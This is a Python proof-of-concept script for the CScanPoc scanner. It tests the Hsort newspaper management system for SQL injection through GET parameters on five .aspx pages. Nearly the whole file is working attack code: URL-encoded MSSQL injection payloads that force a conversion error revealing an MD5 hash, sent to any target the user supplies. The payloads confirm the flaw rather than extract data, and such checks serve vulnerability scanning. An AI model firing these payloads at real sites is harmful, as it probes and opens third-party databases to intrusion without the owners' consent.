# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Hsort_0009'  # 平台漏洞编号，留空
    name = 'Hsort报刊管理系统getsql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-29'  # 漏洞公布时间
    desc = '''
        Hsort报刊管理系统多处GET型sql注入。
        /newsInfo.aspx?type=
        /category.aspx?category=
        /transfor.aspx?paperName=
        /pagePiclist.aspx
        /getReault.aspx?paperName=1
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0110055'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hsort'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5b5e9cf6-28dc-4db4-be48-c9af32add94a'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/newsInfo.aspx?type=per&id=1&paperName=1&qnum=1&pagenum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/category.aspx?category=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/transfor.aspx?paperName=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/pagePiclist.aspx?paperName=1&qnum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)&pagenum=1",
                "/getReault.aspx?paperName=1&bdate=01/01/2011&edate=01/01/2011&news=%27)%20and%201=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
            ]
            for p in ps:
                url = arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code == 500 and "cc175b9c0f1b6a831c399e269772661" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
